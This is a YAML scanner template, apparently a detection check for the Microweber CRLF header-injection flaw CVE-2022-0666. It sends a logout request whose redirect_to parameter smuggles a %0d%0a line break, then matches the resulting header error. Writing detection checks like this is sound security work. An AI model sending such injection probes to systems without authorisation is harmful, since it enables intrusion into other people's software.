name: poc-yaml-microweber-cve-2022-0666
transport: http
rules:
  r1:
    request:
      method: GET
      path: /api/logout?redirect_to=xyz%0d%0axyz
    expression:
      response.body.bcontains(b"ErrorException") && response.status == 500 && response.body.bcontains(b"Response.php") && response.body.bcontains(b"Header may not contain more than a single header, new line detected")
expression:
  r1()

detail:
  author: xiaobaicai
  links:
    - https://huntr.dev/bounties/7215afc7-9133-4749-8e8e-0569317dbd55
  version: 1.2.11
  vulnerability:
    level: high
    id: CT-390030
